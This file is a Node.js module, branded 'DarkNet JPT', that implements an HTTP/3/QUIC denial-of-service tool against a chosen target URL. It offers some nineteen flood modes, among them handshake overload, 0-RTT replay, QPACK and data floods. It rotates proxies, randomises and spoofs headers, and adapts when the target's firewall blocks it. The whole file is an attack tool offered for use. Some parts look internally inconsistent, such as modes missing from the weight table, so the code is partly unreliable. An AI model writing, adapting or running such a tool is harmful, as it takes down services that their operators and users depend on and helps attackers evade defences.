const { createQuicClient } = require('node-quic');
const quiche = require('quiche');
const crypto = require('crypto');
const { parse: parseUrl } = require('url');
const fs = require('fs');

let totalRequests = 0;
let successRequests = 0;
let failedRequests = 0;
let networkUsage = 0;
let statusCodeStats = {};
let proxyStats = new Map();
let blockedProxies = new Set();
let lastLogTime = Date.now();
let proxyRecoveryQueue = new Map();
let modeStats = new Map();
let bandwidthUsage = 0;
let latencyHistory = [];
let responseSizeHistory = [];
let resourceUsage = { requestsPerSec: 0, lastUpdate: Date.now() };

const http3Modes = [
    { name: 'handshakeOverload', weight: 0.1 },
    { name: 'cidRotationAbuse', weight: 0.1 },
    { name: 'zeroRttReplay', weight: 0.1 },
    { name: 'fakeMigrationFlood', weight: 0.1 },
    { name: 'qpackFlood', weight: 0.15 },
    { name: 'priorityUpdateFlood', weight: 0.08 },
    { name: 'goawayFlood', weight: 0.05 },
    { name: 'streamResetFlood', weight: 0.05 },
    { name: 'settingsFlood', weight: 0.08 },
    { name: 'dataFlood', weight: 0.05 },
    { name: 'connectionCloseFlood', weight: 0.05 },
    { name: 'legitRequestFlood', weight: 0.15 },
    { name: 'maxDataFlood', weight: 0.05 },
    { name: 'maxStreamDataFlood', weight: 0.05 },
    { name: 'pathChallengeFlood', weight: 0.05 },
    { name: 'invalidFrameFlood', weight: 0.03 },
];

function getPoissonInterval(lambda) {
    return -Math.log(1.0 - Math.random()) / lambda * 1000;
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function validateInputs(proxy, target, rate) {
    if (proxy && !proxy.includes(':')) {
        throw new Error(`Invalid proxy format: ${proxy}. Expected host:port`);
    }
    if (proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
            throw new Error(`Invalid proxy host or port: ${proxy}`);
        }
    }
    const parsed = parseUrl(target);
    if (!['http:', 'https:'].includes(parsed.protocol) || !parsed.hostname) {
        throw new Error('URL must use http or https protocol and have a valid hostname');
    }
    if (!Number.isInteger(rate) || rate <= 0) {
        console.warn(`[DarkNet JPT] [WARN] Invalid rate: ${rate}. Defaulting to 100`);
        return 100;
    }
    return rate;
}

function generateRandomHeaders(parsed) {
    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    ];
    const referers = [
        `https://${parsed.hostname}/`,
        'https://example.com/',
        'https://google.com/',
        `https://${parsed.hostname}/${crypto.randomBytes(6).toString('hex')}`,
        `https://${parsed.hostname}/static/${crypto.randomBytes(4).toString('hex')}.js`,
    ];
    const alpnProtocols = ['h3', 'h3-29', 'h3-32', 'h3-34'];
    return {
        ':method': ['GET', 'POST'][Math.floor(Math.random() * 2)],
        ':path': parsed.pathname || `/${crypto.randomBytes(10).toString('hex')}`,
        ':authority': parsed.hostname,
        ':scheme': 'https',
        'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
        'accept-language': ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.8'][Math.floor(Math.random() * 4)],
        'referer': referers[Math.floor(Math.random() * referers.length)],
        'accept-encoding': ['gzip', 'deflate', 'br', 'zstd'][Math.floor(Math.random() * 4)],
        'x-forwarded-for': `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
        'cache-control': ['no-cache', 'max-age=0', 'no-store', 'must-revalidate'][Math.floor(Math.random() * 4)],
        'padding': crypto.randomBytes(Math.floor(Math.random() * 1000)).toString('base64'),
        'alpn': alpnProtocols[Math.floor(Math.random() * alpnProtocols.length)],
        'accept': ['text/html', 'application/json', 'image/jpeg', '*/*'][Math.floor(Math.random() * 4)],
    };
}

function generateQpackHeaders(parsed) {
    const headers = generateRandomHeaders(parsed);
    const qpack = new quiche.Qpack();
    const headerBlock = [];
    for (let i = 0; i < 100; i++) {
        headerBlock.push({
            name: `x-custom-${crypto.randomBytes(10).toString('hex')}`,
            value: crypto.randomBytes(Math.floor(Math.random() * 500)).toString('base64'),
        });
        if (Math.random() < 0.4) {
            headerBlock.push({
                name: headers[':path'],
                value: headers[':path'] + crypto.randomBytes(6).toString('hex'),
            });
        }
        if (Math.random() < 0.2) {
            headerBlock.push({
                name: 'x-duplicate',
                value: headers['user-agent'],
            });
        }
    }
    const encoded = qpack.encode(headers, headerBlock, {
        insertCount: Math.floor(Math.random() * 200),
        duplicateCount: Math.floor(Math.random() * 50),
        tableCapacity: Math.floor(Math.random() * 10000) + 5000,
    });
    return {
        headers,
        qpack: {
            encoded,
            tableSize: Math.floor(Math.random() * 50000) + 10000,
        },
    };
}

async function createClient(proxy, target, options = {}) {
    const parsed = parseUrl(target);
    const config = {
        host: parsed.hostname,
        port: 443,
        enable0Rtt: options.enable0Rtt || false,
        cid: options.cid || crypto.randomBytes(8),
        timeout: options.timeout || 2000,
        alpn: options.alpn || ['h3', 'h3-29', 'h3-32', 'h3-34'][Math.floor(Math.random() * 4)],
        ciphers: [
            'TLS_AES_128_GCM_SHA256',
            'TLS_AES_256_GCM_SHA384',
            'TLS_CHACHA20_POLY1305_SHA256',
            'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
        ][Math.floor(Math.random() * 4)],
        sni: parsed.hostname,
        extensions: {
            keyShare: crypto.randomBytes(32),
            supportedVersions: ['TLSv1.3', 'TLSv1.2'][Math.floor(Math.random() * 2)],
        },
    };
    if (proxy) {
        const [proxyHost, proxyPort] = proxy.split(':');
        config.proxy = { host: proxyHost, port: Number(proxyPort) };
    }
    return createQuicClient(config);
}

function batchLogStats() {
    if (Date.now() - lastLogTime < 2000) return;
    const logData = {
        timestamp: new Date().toISOString(),
        totalRequests,
        successRequests,
        failedRequests,
        statusCodeStats,
        proxyStats: Object.fromEntries(proxyStats),
        modeStats: Object.fromEntries(modeStats),
        bandwidthUsage,
        avgLatency: latencyHistory.length ? latencyHistory.reduce((sum, l) => sum + l, 0) / latencyHistory.length : 0,
        avgResponseSize: responseSizeHistory.length ? responseSizeHistory.reduce((sum, s) => sum + s, 0) / responseSizeHistory.length : 0,
        resourceUsage,
    };
    fs.appendFileSync('attack_log.json', JSON.stringify(logData) + '\n');
    lastLogTime = Date.now();
}

function updateProxyStats(proxy, success, bytes, status) {
    const stats = proxyStats.get(proxy) || { success: 0, failed: 0, bytes: 0, history: [] };
    stats.history.push({ success, timestamp: Date.now(), status });
    if (stats.history.length > 200) stats.history.shift();
    proxyStats.set(proxy, {
        success: stats.success + (success ? 1 : 0),
        failed: stats.failed + (success ? 0 : 1),
        bytes: stats.bytes + bytes,
        history: stats.history,
    });
    if (stats.failed > 20 && stats.success / (stats.failed + 1) < 0.1) {
        blockedProxies.add(proxy);
        proxyRecoveryQueue.set(proxy, Date.now() + 15000);
        console.log(`[DarkNet JPT] [WARN] Proxy ${proxy} marked as ineffective, queued for recovery`);
    }
    if (proxyRecoveryQueue.has(proxy) && Date.now() > proxyRecoveryQueue.get(proxy)) {
        const recentSuccess = stats.history.filter(h => h.timestamp > Date.now() - 300000).filter(h => h.success).length;
        if (recentSuccess / stats.history.length > 0.7) {
            blockedProxies.delete(proxy);
            proxyRecoveryQueue.delete(proxy);
            console.log(`[DarkNet JPT] [INFO] Proxy ${proxy} recovered`);
        }
    }
}

async function testProxy(proxy, target) {
    try {
        const client = await createClient(proxy, target, { timeout: 1500 });
        await client.sendInitialPacket();
        client.close();
        return true;
    } catch (err) {
        console.warn(`[DarkNet JPT] [WARN] Proxy test failed for ${proxy}: ${err.message}`);
        return false;
    }
}

async function handleResponse(proxy, data, startTime) {
    const status = data.status || 'unknown';
    const latency = Date.now() - startTime;
    const responseSize = Buffer.byteLength(JSON.stringify(data));
    latencyHistory.push(latency);
    responseSizeHistory.push(responseSize);
    if (latencyHistory.length > 200) latencyHistory.shift();
    if (responseSizeHistory.length > 200) responseSizeHistory.shift();
    console.log(`[DarkNet JPT] [SEND] ${status} (Latency: ${latency}ms, Size: ${responseSize} bytes)`);
    statusCodeStats[status] = (statusCodeStats[status] || 0) + 1;
    
    if (status === '403' || status === '429' || status === '503') {
        blockedProxies.add(proxy);
        proxyRecoveryQueue.set(proxy, Date.now() + 15000);
        console.log(`[DarkNet JPT] [WARN] Proxy ${proxy} blocked by target firewall`);
    }
    
    const success = ['200', '201', '202'].includes(status);
    if (success) successRequests++;
    else failedRequests++;
    
    updateProxyStats(proxy, success, responseSize, status);
    bandwidthUsage += responseSize;
    batchLogStats();
}

function selectRandomProxy(proxies) {
    const availableProxies = proxies.filter(p => !blockedProxies.has(p));
    if (availableProxies.length === 0) {
        console.warn(`[DarkNet JPT] [WARN] No available proxies, attempting direct connection`);
        return null;
    }
    const scoredProxies = availableProxies.map(p => {
        const stats = proxyStats.get(p) || { success: 0, failed: 0 };
        const recentSuccess = stats.history?.filter(h => h.timestamp > Date.now() - 300000).filter(h => h.success).length || 0;
        const score = recentSuccess / (stats.history?.length || 1) + stats.success / (stats.failed + 1);
        return { proxy: p, score };
    }).sort((a, b) => b.score - a.score);
    return scoredProxies[Math.floor(Math.random() * Math.min(5, scoredProxies.length))].proxy;
}

function selectMode(currentMode) {
    const stats = modeStats.get(currentMode) || { success: 0, failed: 0, weight: http3Modes.find(m => m.name === currentMode)?.weight || 0.1, history: [] };
    const recentSuccess = stats.history.filter(h => h.timestamp > Date.now() - 300000).filter(h => h.success).length;
    if (stats.failed > 20 && stats.success / (stats.failed + 1) < 0.1 || recentSuccess / (stats.history.length || 1) < 0.1) {
        console.log(`[DarkNet JPT] [INFO] Mode ${currentMode} blocked, switching to another mode`);
        const availableModes = http3Modes.filter(m => m.name !== currentMode);
        return availableModes[Math.floor(Math.random() * availableModes.length)].name;
    }
    if (recentSuccess / (stats.history.length || 1) > 0.8) {
        return currentMode;
    }
    const totalWeight = http3Modes.reduce((sum, mode) => sum + (modeStats.get(mode.name)?.weight || mode.weight), 0);
    let random = Math.random() * totalWeight;
    for (const mode of http3Modes) {
        random -= (modeStats.get(mode.name)?.weight || mode.weight);
        if (random <= 0) return mode.name;
    }
    return http3Modes[0].name;
}

function updateModeStats(mode, success) {
    const stats = modeStats.get(mode) || { success: 0, failed: 0, weight: http3Modes.find(m => m.name === mode).weight, history: [] };
    stats.history.push({ success, timestamp: Date.now() });
    if (stats.history.length > 200) stats.history.shift();
    modeStats.set(mode, {
        success: stats.success + (success ? 1 : 0),
        failed: stats.failed + (success ? 0 : 1),
        weight: stats.weight * (success ? 1.3 : 0.6),
        history: stats.history,
    });
}

async function runAttack(proxy, target, rate, options, attackCallback) {
    if (proxy && blockedProxies.has(proxy)) {
        console.warn(`[DarkNet JPT] [WARN] Skipping blocked proxy: ${proxy}`);
        return;
    }

    rate = validateInputs(proxy, target, rate);
    const parsed = parseUrl(target);
    let client;
    let retries = 5;

    while (retries > 0) {
        try {
            client = await createClient(proxy, target, options);
            client.on('response', data => handleResponse(proxy, data, Date.now()));

            while (true) {
                if (proxy && blockedProxies.has(proxy)) break;
                
                const now = Date.now();
                resourceUsage.requestsPerSec = (resourceUsage.requestsPerSec * 0.9) + (totalRequests / ((now - resourceUsage.lastUpdate + 1) / 1000) * 0.1);
                resourceUsage.lastUpdate = now;
                if (resourceUsage.requestsPerSec > 2000 || latencyHistory.length && latencyHistory.reduce((sum, l) => sum + l, 0) / latencyHistory.length > 10000 || responseSizeHistory.length && responseSizeHistory.reduce((sum, s) => sum + s, 0) / responseSizeHistory.length > 1000000) {
                    console.log(`[DarkNet JPT] [INFO] High resource usage or latency, pausing for 3s`);
                    await sleep(3000);
                    rate = Math.max(1, Math.floor(rate * 0.5));
                    options.batchSize = Math.max(1, options.batchSize * 0.5);
                }

                await sleep(Math.random() * 50 + 5);
                for (let i = 0; i < rate; i++) {
                    if (Math.random() < 0.1) {
                        await client.sendSettings({
                            maxTableCapacity: Math.floor(Math.random() * 1000000),
                            maxBlockedStreams: Math.floor(Math.random() * 1000),
                        });
                    }
                    await attackCallback(client, parsed);
                    totalRequests++;
                    networkUsage += options.packetSize || 128;
                    bandwidthUsage += options.packetSize || 128;
                    await sleep(Math.random() * 40 + 5);
                }
                await sleep(getPoissonInterval(rate / 1000));
            }
            break;
        } catch (err) {
            console.warn(`[DarkNet JPT] [WARN] Attack error: ${err.message}`);
            failedRequests++;
            updateProxyStats(proxy, false, networkUsage);
            updateModeStats(options.mode, false);
            batchLogStats();
            retries--;
            if (retries > 0) {
                console.log(`[DarkNet JPT] [INFO] Retrying... (${retries} attempts left)`);
                await sleep(300);
                client?.close();
            }
        }
    }

    if (retries === 0) {
        console.error(`[DarkNet JPT] [ERROR] Failed after retries for proxy: ${proxy || 'direct'}`);
        updateProxyStats(proxy, false, 0);
        updateModeStats(options.mode, false);
        batchLogStats();
    }
    client?.close();
}

async function handshakeOverload(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 1024, mode: 'handshakeOverload' }, async (client, parsed) => {
        await client.sendInitialPacket();
    });
}

async function cidRotationAbuse(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 256, mode: 'cidRotationAbuse' }, async (client, parsed) => {
        await client.changeCid(crypto.randomBytes(8));
    });
}

async function packetReplayAttack(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 64, mode: 'packetReplayAttack' }, async (client, parsed) => {
        const packet = {
            sequence: Math.floor(Math.random() * 100000000000),
            payload: crypto.randomBytes(2 + Math.floor(Math.random() * 4094)),
        };
        await client.sendPacket(packet);
    });
}

async function maxStreamIdExplosion(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 128, mode: 'maxStreamIdExplosion' }, async (client, parsed) => {
        await client.requestMaxStreamId(Math.floor(Math.random() * 100000000) + 1000000);
    });
}

async function ackFlooding(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 64, mode: 'ackFlooding' }, async (client, parsed) => {
        await client.sendAckFrame({ sequence: Math.floor(Math.random() * 100000000000) });
    });
}

async function zeroRttReplay(proxy, target, reqmethod, rate, options) {
    const sessionTickets = [];
    await runAttack(proxy, target, rate, { packetSize: 128, enable0Rtt: true, mode: 'zeroRttReplay' }, async (client, parsed) => {
        let sessionTicket = await client.getSessionTicket();
        if (sessionTickets.length > 0 && Math.random() < 0.7) {
            sessionTicket = sessionTickets[Math.floor(Math.random() * sessionTickets.length)];
        } else {
            sessionTickets.push(sessionTicket);
        }
        await client.send0RttRequest({
            sessionTicket,
            headers: generateQpackHeaders(parsed),
            data: crypto.randomBytes(2 + Math.floor(Math.random() * 4094)),
        });
    });
}

async function fakeMigrationFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 128, mode: 'fakeMigrationFlood' }, async (client, parsed) => {
        const fakeIp = `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
        await client.migrateConnection({ newIp: fakeIp });
    });
}

async function qpackFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 1024, mode: 'qpackFlood' }, async (client, parsed) => {
        const qpackData = generateQpackHeaders(parsed);
        for (let i = 0; i < 5; i++) {
            await client.sendHeaders({
                headers: qpackData.headers,
                qpack: qpackData.qpack,
            });
            if (Math.random() < 0.3) {
                await client.sendQpackInstruction({
                    type: 'Duplicate',
                    index: Math.floor(Math.random() * 100),
                });
            }
        }
    });
}

async function priorityUpdateFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 64, mode: 'priorityUpdateFlood' }, async (client, parsed) => {
        await client.sendPriorityUpdate({
            streamId: Math.floor(Math.random() * 100000000),
            priority: Math.floor(Math.random() * 500),
        });
    });
}

async function goawayFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 64, mode: 'goawayFlood' }, async (client, parsed) => {
        await client.sendGoaway({
            connectionId: crypto.randomBytes(8),
        });
    });
}

async function streamResetFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 64, mode: 'streamResetFlood' }, async (client, parsed) => {
        await client.resetStream({
            streamId: Math.floor(Math.random() * 100000000),
            errorCode: Math.floor(Math.random() * 5000),
        });
    });
}

async function settingsFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 128, mode: 'settingsFlood' }, async (client, parsed) => {
        await client.sendSettings({
            maxTableCapacity: Math.floor(Math.random() * 2000000),
            maxBlockedStreams: Math.floor(Math.random() * 5000),
            maxHeaderListSize: Math.floor(Math.random() * 1000000),
        });
    });
}

async function dataFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 2097152, mode: 'dataFlood' }, async (client, parsed) => {
        await client.sendData({
            streamId: Math.floor(Math.random() * 100000000),
            data: crypto.randomBytes(1024 * 1024 * (2 + Math.floor(Math.random() * 8))),
        });
    });
}

async function connectionCloseFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 64, mode: 'connectionCloseFlood' }, async (client, parsed) => {
        await client.sendConnectionClose({
            errorCode: Math.floor(Math.random() * 5000),
            reason: crypto.randomBytes(Math.floor(Math.random() * 200)).toString('base64'),
        });
    });
}

async function legitRequestFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 512, mode: 'legitRequestFlood' }, async (client, parsed) => {
        const streamId = Math.floor(Math.random() * 100000000);
        await client.sendRequest({
            headers: generateQpackHeaders(parsed),
            data: crypto.randomBytes(Math.floor(Math.random() * 1024)),
            streamId,
        });
        if (Math.random() < 0.3) {
            await sleep(500);
            await client.sendData({
                streamId,
                data: crypto.randomBytes(1024 + Math.floor(Math.random() * 4096)),
            });
            if (Math.random() < 0.2) {
                await sleep(1000);
                await client.sendData({
                    streamId,
                    data: crypto.randomBytes(512),
                });
            }
        }
    });
}

async function maxDataFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 128, mode: 'maxDataFlood' }, async (client, parsed) => {
        await client.sendMaxData({
            maxData: Math.floor(Math.random() * 1000000000),
        });
    });
}

async function maxStreamDataFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 128, mode: 'maxStreamDataFlood' }, async (client, parsed) => {
        await client.sendMaxStreamData({
            streamId: Math.floor(Math.random() * 100000000),
            maxData: Math.floor(Math.random() * 100000000),
        });
    });
}

async function pathChallengeFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 64, mode: 'pathChallengeFlood' }, async (client, parsed) => {
        await client.sendPathChallenge({
            data: crypto.randomBytes(8),
        });
    });
}

async function invalidFrameFlood(proxy, target, reqmethod, rate, options) {
    await runAttack(proxy, target, rate, { packetSize: 64, mode: 'invalidFrameFlood' }, async (client, parsed) => {
        await client.sendFrame({
            type: Math.floor(Math.random() * 1000) + 1000,
            payload: crypto.randomBytes(Math.floor(Math.random() * 512)),
        });
    });
}

async function http3Attack(proxies, target, reqmethod, rate, options = {}) {
    const attackFunctions = {
        handshakeOverload,
        cidRotationAbuse,
        zeroRttReplay,
        fakeMigrationFlood,
        qpackFlood,
        priorityUpdateFlood,
        goawayFlood,
        streamResetFlood,
        settingsFlood,
        dataFlood,
        connectionCloseFlood,
        legitRequestFlood,
        maxDataFlood,
        maxStreamDataFlood,
        pathChallengeFlood,
        invalidFrameFlood,
        packetReplayAttack,
        maxStreamIdExplosion,
        ackFlooding,
    };
    const batchSize = options.batchSize || 10;
    const maxDuration = options.maxDuration || 60000;
    const maxBandwidth = options.maxBandwidth || 5000000;
    const startTime = Date.now();
    let currentMode = http3Modes[0].name;

    while (Date.now() - startTime < maxDuration && bandwidthUsage < maxBandwidth) {
        const proxy = selectRandomProxy(proxies);
        currentMode = selectMode(currentMode);
        console.log(`[DarkNet JPT] [INFO] Running mode: ${currentMode} with proxy: ${proxy || 'direct'}`);
        
        if (proxy && proxyRecoveryQueue.has(proxy) && Date.now() > proxyRecoveryQueue.get(proxy)) {
            if (await testProxy(proxy, target)) {
                blockedProxies.delete(proxy);
                proxyRecoveryQueue.delete(proxy);
                console.log(`[DarkNet JPT] [INFO] Proxy ${proxy} recovered after test`);
            }
        }

        try {
            await attackFunctions[currentMode](proxy, target, Math.min(rate, batchSize), options);
            updateModeStats(currentMode, true);
        } catch (err) {
            console.warn(`[DarkNet JPT] [WARN] Mode ${currentMode} failed: ${err.message}`);
            updateModeStats(currentMode, false);
            if (currentMode === 'zeroRttReplay') {
                console.log(`[DarkNet JPT] [INFO] Falling back to legitRequestFlood`);
                await attackFunctions['legitRequestFlood'](proxy, target, Math.min(rate, batchSize), options);
            } else if (currentMode === 'qpackFlood') {
                console.log(`[DarkNet JPT] [INFO] Falling back to settingsFlood`);
                await attackFunctions['settingsFlood'](proxy, target, Math.min(rate, batchSize), options);
            } else if (currentMode === 'dataFlood') {
                console.log(`[DarkNet JPT] [INFO] Falling back to maxDataFlood`);
                await attackFunctions['maxDataFlood'](proxy, target, Math.min(rate, batchSize), options);
            } else {
                console.log(`[DarkNet JPT] [INFO] Falling back to legitRequestFlood`);
                await attackFunctions['legitRequestFlood'](proxy, target, Math.min(rate, batchSize / 2), options);
            }
        }

        if (bandwidthUsage > maxBandwidth || resourceUsage.requestsPerSec > 2000 || responseSizeHistory.length && responseSizeHistory.reduce((sum, s) => sum + s, 0) / responseSizeHistory.length > 1000000) {
            console.log(`[DarkNet JPT] [INFO] Resource limit reached, reducing batch size and rate`);
            options.batchSize = Math.max(1, Math.floor(batchSize * 0.4));
            rate = Math.max(1, Math.floor(rate * 0.4));
        }

        await sleep(getPoissonInterval(rate / 1000));
    }
}

module.exports = {
    http3Attack,
    handshakeOverload,
    cidRotationAbuse,
    packetReplayAttack,
    maxStreamIdExplosion,
    ackFlooding,
    zeroRttReplay,
    fakeMigrationFlood,
    qpackFlood,
    priorityUpdateFlood,
    goawayFlood,
    streamResetFlood,
    settingsFlood,
    dataFlood,
    connectionCloseFlood,
    legitRequestFlood,
    maxDataFlood,
    maxStreamDataFlood,
    pathChallengeFlood,
    invalidFrameFlood,
};